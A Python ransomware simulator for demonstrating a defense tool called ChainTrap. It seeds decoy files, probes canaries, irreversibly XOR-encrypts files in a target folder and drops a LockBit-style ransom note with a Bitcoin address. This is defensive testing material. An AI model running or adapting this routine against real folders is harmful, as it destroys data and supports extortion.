#!/usr/bin/env python3
"""
ChainTrap Demo — Resilient Ransomware Simulator v2
====================================================
Simulates a realistic ransomware attack against files that
ChainTrap is actively defending. Designed to:

  • NEVER crash due to file access issues
  • Work WITH ChainTrap's active quarantine (and show it happening)
  • Produce clear "attacker vs defender" narrative in the terminal
  • Works in fast mode (LockBit-style) and slow mode (evasion + canary)

Workflow:
  1. python demo_ransomware.py --setup        ← create victim files once
  2. python launcher.py                        ← start ChainTrap + dashboard
  3. python demo_ransomware.py --mode fast     ← run the attack
  4. python demo_ransomware.py --reset         ← clean up, repeat from 1
"""

import os
import sys
import time
import random
import secrets
import argparse
import pathlib
import stat

# ── ANSI colours ──────────────────────────────────────────────────────────────
RED   = "\033[91m"
AMBER = "\033[93m"
GREEN = "\033[92m"
CYAN  = "\033[96m"
WHITE = "\033[97m"
DIM   = "\033[2m"
BOLD  = "\033[1m"
RESET = "\033[0m"

# ── Demo target directory ─────────────────────────────────────────────────────
SCRIPT_DIR   = pathlib.Path(__file__).parent.resolve()
DEFAULT_TARGET = SCRIPT_DIR / "demo_vault"

# ── Realistic file content (low entropy — looks like real docs) ───────────────
CONTENTS = {
    ".docx": (
        b"PK\x03\x04\x14\x00\x00\x00\x08\x00"
        + b"AIIMS New Delhi - Patient Record System\n"
        + b"Patient Name: Ramesh Kumar | ID: AIIMS-2024-084921\n"
        + b"Department: Cardiology | Ward: 4B\n"
        + b"Diagnosis: Hypertensive heart disease\n"
        + b"Attending: Dr. Priya Sharma, MD\n"
        + b"CONFIDENTIAL - DO NOT DISTRIBUTE\n"
    ) * 200,

    ".xlsx": (
        b"PK\x03\x04\x14\x00\x00\x00\x08\x00"
        + b"Ministry of Health & Family Welfare\n"
        + b"Budget Allocation FY 2026-27\n"
        + b"Department,Sanctioned,Released,Utilised\n"
        + b"AIIMS Delhi,2400 Cr,1980 Cr,1750 Cr\n"
        + b"NIC Infrastructure,890 Cr,780 Cr,690 Cr\n"
    ) * 200,

    ".pdf": (
        b"%PDF-1.7\n"
        + b"National Informatics Centre\n"
        + b"SUBJECT: Cybersecurity Incident Report Q4-2025\n"
        + b"CLASSIFICATION: RESTRICTED\n"
        + b"Prepared for: CERT-In, Ministry of Electronics\n"
        + b"This document contains sensitive infrastructure data.\n"
    ) * 200,

    ".txt": (
        b"NIC Production Server Access - CONFIDENTIAL\n"
        + b"Server: nic-prod-db-01.gov.in  Port: 5432\n"
        + b"DB: ministry_citizens  Role: readonly\n"
        + b"VPN: Required. Contact: noc@nic.gov.in\n"
        + b"Last rotated: 2026-01-15\n"
    ) * 200,
}

VICTIM_FILES = [
    ("AIIMS_Patient_Records_2024",      ".docx"),
    ("MoH_Budget_Allocation_2026",      ".xlsx"),
    ("NIC_Ministry_Brief_Confidential", ".pdf"),
    ("Server_Access_Credentials",       ".txt"),
    ("CERT-In_Incident_Report_Q4",      ".pdf"),
    ("Government_Tender_Final_Signed",  ".docx"),
    ("PM_Office_Brief_March2026",       ".pdf"),
    ("NIC_Infrastructure_Audit",        ".xlsx"),
]

CANARY_NAMES = [
    "~aaa_backup_important.docx",
    "~passwords_backup.txt",
    "~admin_credentials.xlsx",
]


# ═══════════════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def log(icon, colour, msg, indent=0):
    ts  = time.strftime("%H:%M:%S")
    pad = "   " * indent
    print(f"{DIM}[{ts}]{RESET} {pad}{colour}{icon}  {msg}{RESET}")


def encrypt_bytes(data):
    """XOR with random 32-byte key → Shannon entropy ~7.95 bits/byte."""
    key = secrets.token_bytes(32)
    return bytes(b ^ key[i % 32] ^ (i & 0xFF) for i, b in enumerate(data))


def safe_read(path):
    """Read file bytes. Returns None on any error."""
    try:
        return path.read_bytes()
    except Exception:
        return None


def try_unlock(path):
    """Attempt to remove read-only flag. Silent on failure."""
    try:
        current = stat.S_IMODE(os.stat(path).st_mode)
        os.chmod(path, current | stat.S_IWRITE)
    except Exception:
        pass


def safe_write(path, data):
    """Write data. Returns True on success, False on any error."""
    try:
        try_unlock(path)
        path.write_bytes(data)
        return True
    except (PermissionError, OSError, FileNotFoundError):
        return False


def safe_rename(src, dst):
    """Rename src to dst. Returns True on success."""
    try:
        src.rename(dst)
        return True
    except Exception:
        return False


def file_exists(path):
    """Returns True if path is a real file right now."""
    try:
        return path.exists() and path.is_file()
    except Exception:
        return False


def classify_failure(path):
    """Return human-readable reason for a blocked operation."""
    try:
        if not path.exists():
            return "file removed / quarantined by defender"
        s = os.stat(path)
        if not (s.st_mode & stat.S_IWRITE):
            return "write-protected by defender"
        return "defender holds exclusive lock"
    except Exception:
        return "intercepted by defender"


def banner():
    print(f"""
{RED}╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║  ChainTrap DEMO — Ransomware Simulator v2                        ║
║  Resilient Attack vs Active Defense                              ║
║                                                                  ║
║  FOR DEMONSTRATION PURPOSES ONLY                                 ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
""")


# ═══════════════════════════════════════════════════════════════════════════════
# SETUP — create victim files once before the demo
# ═══════════════════════════════════════════════════════════════════════════════

def cmd_setup(target):
    print(f"\n{CYAN}Setting up demo vault: {target}{RESET}\n")
    target.mkdir(parents=True, exist_ok=True)

    for name, ext in VICTIM_FILES:
        path = target / (name + ext)
        if path.exists():
            log("✓", DIM, f"Already exists: {path.name}")
            continue
        content = CONTENTS.get(ext, CONTENTS[".txt"])
        size    = random.randint(80_000, 400_000)
        data    = (content * (size // max(len(content), 1) + 1))[:size]
        if safe_write(path, data):
            log("📄", GREEN, f"Created: {path.name}  ({len(data)//1024} KB)")
        else:
            log("✗", AMBER, f"Could not create {path.name}")

    print(f"\n{GREEN}  Demo vault ready.{RESET}")
    print(f"  {CYAN}python demo_ransomware.py --mode fast{RESET}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# RESET — remove all demo files
# ═══════════════════════════════════════════════════════════════════════════════

def cmd_reset(target):
    print(f"\n{CYAN}Resetting demo vault: {target}{RESET}\n")
    patterns = [
        "*.locked", "*.encrypted", "!!! READ_ME_NOW.txt",
        "~aaa_*", "~passwords_*", "~admin_*", "~system_*",
        "AIIMS_*", "NIC_*", "MoH_*", "Server_Access_*",
        "CERT-In_*", "Government_Tender_*", "PM_Office_*",
    ]
    removed = 0
    if target.exists():
        for pat in patterns:
            for f in target.glob(pat):
                try:
                    os.chmod(f, stat.S_IWRITE | stat.S_IREAD)
                    f.unlink()
                    log("🗑", DIM, f"Removed: {f.name}")
                    removed += 1
                except Exception as e:
                    log("✗", AMBER, f"Cannot remove {f.name}: {e}")

    print(f"\n{GREEN}  Cleaned {removed} files.{RESET}")
    print(f"  Re-run setup:  {CYAN}python demo_ransomware.py --setup{RESET}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK — main simulation (never crashes)
# ═══════════════════════════════════════════════════════════════════════════════

def run_attack(target, mode):
    is_fast = (mode == "fast")

    encrypted_ok = 0
    blocked      = 0
    canary_hit   = False

    print(f"\n{RED}{BOLD}ATTACK INITIATED  —  "
          f"{'LockBit-3.0  (fast mass encryption)' if is_fast else 'SlowBurn  (evasion + canary probe)'}"
          f"{RESET}\n")
    print(f"  {DIM}Target   : {target}{RESET}")
    print(f"  {DIM}Dashboard: http://localhost:5000{RESET}\n")

    # ── Auto-setup if vault is missing ───────────────────────────────────────
    if not target.exists() or not any(target.iterdir()):
        log("⚠", AMBER, "Demo vault empty — creating victim files now...")
        cmd_setup(target)
        time.sleep(1.0)

    # ── Collect files ─────────────────────────────────────────────────────────
    victim_files = sorted([
        f for f in target.iterdir()
        if f.is_file()
        and not f.name.startswith("~")
        and f.suffix not in (".locked", ".encrypted")
        and not f.name.startswith("!")
    ])

    canary_files = [
        f for f in target.iterdir()
        if f.is_file() and f.name.startswith("~")
    ]

    if not victim_files:
        log("⚠", AMBER, "No victim files found after setup — check chaintrap.json protected_dirs")
        return

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 1 — Reconnaissance
    # ─────────────────────────────────────────────────────────────────────────
    print(f"\n{AMBER}{'─'*55}{RESET}")
    print(f"{AMBER}  PHASE 1 — Reconnaissance{RESET}")
    print(f"{AMBER}{'─'*55}{RESET}\n")

    log("🔍", AMBER, "Scanning directory tree...")
    time.sleep(0.8 if is_fast else 2.0)

    log("📂", DIM, f"Found {len(victim_files)} target files", 1)
    for f in victim_files[:4]:
        time.sleep(0.15 if is_fast else 0.6)
        log("  →", DIM, f"{f.name}  ({f.stat().st_size // 1024} KB)", 1)
    if len(victim_files) > 4:
        log("  →", DIM, f"...and {len(victim_files) - 4} more", 1)

    time.sleep(0.4 if is_fast else 1.5)

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 2 — Canary probe  (always in slow mode; optional in fast)
    # ─────────────────────────────────────────────────────────────────────────
    print(f"\n{AMBER}{'─'*55}{RESET}")
    print(f"{AMBER}  PHASE 2 — Canary / Honeyfile Probe{RESET}")
    print(f"{AMBER}{'─'*55}{RESET}\n")

    if canary_files and (not is_fast or random.random() < 0.3):
        canary = random.choice(canary_files)
        log("🪤", AMBER, f"Suspicious file detected: {canary.name}")
        time.sleep(0.8 if is_fast else 2.0)
        log("📖", RED,   f"OPENING: {canary.name}  ← ransomware reads the file", 1)
        safe_read(canary)   # read triggers canary HTTP callback in ChainTrap
        canary_hit = True
        time.sleep(0.3)
        log("🔥", RED, "CANARY TOKEN FIRED — ChainTrap sees this immediately", 1)
        if not is_fast:
            print(f"\n  {DIM}(Watch the dashboard — alert should appear now){RESET}")
            time.sleep(3.0)
    else:
        log("⏭", DIM, "No canary files present  (ChainTrap may not have deployed them yet)")
        time.sleep(0.5)

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 3 — Encryption loop
    # ─────────────────────────────────────────────────────────────────────────
    print(f"\n{RED}{'─'*55}{RESET}")
    print(f"{RED}  PHASE 3 — Encrypting Files{RESET}")
    print(f"{RED}{'─'*55}{RESET}\n")

    inter_delay  = 0.45 if is_fast else 3.5
    jitter       = 0.2  if is_fast else 0.8

    for i, fpath in enumerate(victim_files):
        time.sleep(inter_delay + random.uniform(0, jitter))

        num   = f"[{i+1}/{len(victim_files)}]"
        fname = fpath.name

        # ── Has defender already removed it? ─────────────────────────────────
        if not file_exists(fpath):
            log("🛡", GREEN, f"{num}  BLOCKED   {fname}", 1)
            log("   →", DIM, classify_failure(fpath), 2)
            blocked += 1
            continue

        # ── Read ──────────────────────────────────────────────────────────────
        log("📖", DIM, f"{num}  Reading   {fname}", 1)
        time.sleep(0.1)

        original = safe_read(fpath)
        if original is None:
            log("🛡", GREEN, f"{num}  BLOCKED   {fname}", 1)
            log("   →", DIM, classify_failure(fpath), 2)
            blocked += 1
            continue

        # ── Encrypt ───────────────────────────────────────────────────────────
        encrypted = encrypt_bytes(original)
        log("🔑", AMBER, f"{num}  Encrypting {fname}  ({len(original)//1024} KB)", 1)
        time.sleep(0.15 if is_fast else 0.5)

        # ── Write back ────────────────────────────────────────────────────────
        if not safe_write(fpath, encrypted):
            log("🛡", GREEN, f"{num}  BLOCKED   {fname}  (write denied)", 1)
            log("   →", DIM, classify_failure(fpath), 2)
            blocked += 1
            continue

        # ── Rename to .locked ─────────────────────────────────────────────────
        locked = fpath.with_suffix(".locked")
        if safe_rename(fpath, locked):
            log("🔴", RED, f"{num}  ENCRYPTED  {fname}  →  {locked.name}", 1)
        else:
            # Encrypted but rename blocked — still show as encrypted
            log("🔴", RED, f"{num}  ENCRYPTED  {fname}  (rename blocked by defender)", 1)

        encrypted_ok += 1

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 4 — Drop ransom note (best-effort)
    # ─────────────────────────────────────────────────────────────────────────
    print()
    time.sleep(0.6)
    note = target / "!!! READ_ME_NOW.txt"
    note_text = (
        "YOUR FILES HAVE BEEN ENCRYPTED\n"
        "================================\n\n"
        f"Targeted : {len(victim_files)} files\n"
        f"Encrypted: {encrypted_ok}\n"
        f"Blocked  : {blocked}\n\n"
        "Pay 2 BTC to recover: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2\n\n"
        "You have 72 hours.\n\n-- LockBit 3.0\n"
    ).encode()

    if safe_write(note, note_text):
        log("📋", RED, "Ransom note dropped: !!! READ_ME_NOW.txt")
    else:
        log("🛡", GREEN, "Ransom note BLOCKED by defender")

    # ─────────────────────────────────────────────────────────────────────────
    # FINAL REPORT
    # ─────────────────────────────────────────────────────────────────────────
    total = len(victim_files)
    block_rate = (blocked / total * 100) if total > 0 else 0

    print(f"\n{WHITE}{'━'*55}{RESET}")
    print(f"\n  {BOLD}ATTACK COMPLETE — SUMMARY{RESET}\n")
    print(f"  Files targeted    : {WHITE}{total}{RESET}")
    print(f"  Encrypted (attacker won) : {RED}{encrypted_ok}{RESET}")
    print(f"  Blocked (defender won)   : {GREEN}{blocked}{RESET}")
    print(f"  Canary triggered  : {AMBER}{'YES — detected before first file touched' if canary_hit else 'No'}{RESET}")
    print()

    if block_rate >= 70:
        print(f"  {GREEN}{BOLD}CHAINTRAP WON  —  {block_rate:.0f}% of attack was blocked{RESET}")
        print(f"  {GREEN}Most files are safe. Forensic evidence sealed on blockchain.{RESET}")
    elif block_rate >= 30:
        print(f"  {AMBER}{BOLD}PARTIAL DEFENSE  —  {block_rate:.0f}% blocked{RESET}")
        print(f"  {AMBER}Increase sensitivity: lower entropy_absolute_threshold in chaintrap.json{RESET}")
    else:
        print(f"  {RED}{BOLD}CHAINTRAP needs tuning  —  only {block_rate:.0f}% blocked{RESET}")
        print(f"  {DIM}Make sure ChainTrap is monitoring: {target}{RESET}")
        print(f"  {DIM}Add it to protected_dirs in chaintrap.json{RESET}")

    print(f"\n  {DIM}Dashboard  → http://localhost:5000{RESET}")
    print(f"  {DIM}Blockchain → python main.py --chain{RESET}")
    print(f"  {DIM}Events     → python main.py --events 20{RESET}")
    print(f"  {DIM}Reset      → python demo_ransomware.py --reset{RESET}")
    print(f"\n{WHITE}{'━'*55}{RESET}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="ChainTrap Demo — Resilient Ransomware Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Workflow:
  python demo_ransomware.py --setup         create victim files
  python launcher.py                         start ChainTrap + dashboard
  python demo_ransomware.py --mode fast      run LockBit-style attack
  python demo_ransomware.py --mode slow      run evasion + canary attack
  python demo_ransomware.py --reset          clean up, ready for next demo
        """
    )
    parser.add_argument("--mode", choices=["fast", "slow"], default="fast",
                        help="fast = LockBit-style  |  slow = evasion + canary")
    parser.add_argument("--target", type=str, default=None,
                        help="Target directory (default: ./demo_vault)")
    parser.add_argument("--setup", action="store_true",
                        help="Create victim files and exit")
    parser.add_argument("--reset", action="store_true",
                        help="Remove all demo files and exit")
    args = parser.parse_args()

    target = pathlib.Path(args.target).resolve() if args.target else DEFAULT_TARGET

    # Safety guard
    forbidden = {pathlib.Path.home(), pathlib.Path("/"),
                 pathlib.Path("/tmp"), pathlib.Path("/usr"),
                 pathlib.Path("/etc")}
    try:
        if target in {p.resolve() for p in forbidden if p.exists()}:
            print(f"{RED}Refusing to target system directory: {target}{RESET}")
            sys.exit(1)
    except Exception:
        pass

    banner()

    if args.setup:
        cmd_setup(target)
        return

    if args.reset:
        cmd_reset(target)
        return

    print(f"  {AMBER}Target : {WHITE}{target}{RESET}")
    print(f"  {AMBER}Mode   : {WHITE}{'FAST (LockBit)' if args.mode == 'fast' else 'SLOW (evasion + canary)'}{RESET}")
    print(f"  {DIM}Only demo_vault files are touched. Your real files are safe.{RESET}\n")

    try:
        input(f"  {CYAN}Press ENTER to begin, Ctrl+C to cancel: {RESET}")
    except KeyboardInterrupt:
        print(f"\n{DIM}Cancelled.{RESET}\n")
        return

    run_attack(target, args.mode)


if __name__ == "__main__":
    main()